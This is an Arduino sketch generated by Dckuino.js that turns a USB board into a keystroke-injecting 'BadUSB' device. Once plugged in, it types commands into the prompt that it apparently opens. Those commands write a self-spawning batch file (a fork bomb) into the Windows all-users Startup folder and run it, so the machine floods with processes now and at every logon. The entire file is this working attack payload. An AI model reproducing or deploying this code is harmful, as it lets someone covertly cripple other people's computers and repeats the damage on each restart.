/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(1000);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  
pinMode(7, INPUT);
      
      
        digitalWrite(7, 1);
bool buttonState = digitalRead(7);
      
      
        if(buttonState == LOW) {
      
      
                 delay(100000000000000000000);
      
      
        }
  
  // Begining the Keyboard stream
  Keyboard.begin();
 

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("a");

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");

  typeKey(KEY_RETURN);

  Keyboard.print("copy con a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  Keyboard.print(":START");

  typeKey(KEY_RETURN);

  Keyboard.print("start a.bat");

  typeKey(KEY_RETURN);

  Keyboard.print("GOTO START");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print ("cd %ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");

  typeKey(KEY_RETURN);

  Keyboard.print("a.bat");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
